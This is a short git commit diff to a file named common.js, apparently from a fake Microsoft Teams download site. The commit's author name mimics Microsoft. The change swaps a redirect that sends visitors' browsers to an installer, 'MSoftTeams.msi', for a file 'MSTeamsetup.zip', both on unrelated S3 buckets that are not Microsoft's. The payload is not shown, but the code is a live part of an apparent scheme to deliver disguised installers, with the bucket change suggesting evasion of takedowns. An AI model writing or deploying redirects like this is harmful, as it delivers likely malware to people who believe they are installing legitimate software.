39ae1e2cc80e4da2d735fdbc6899ebd4353f732a
ms-tearms <mjdkdkkdtyjejjdimonika7@gmail.com>
2025-06-05 21:13:41 +0800

    Update common.js

--- common.js
+++ common.js
@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://g605.s3.ap-southeast-1.amazonaws.com/MSoftTeams.msi";
+	var url="https://gg606.s3.ap-southeast-1.amazonaws.com/MSTeamsetup.zip";
 	window.location=url;
 }
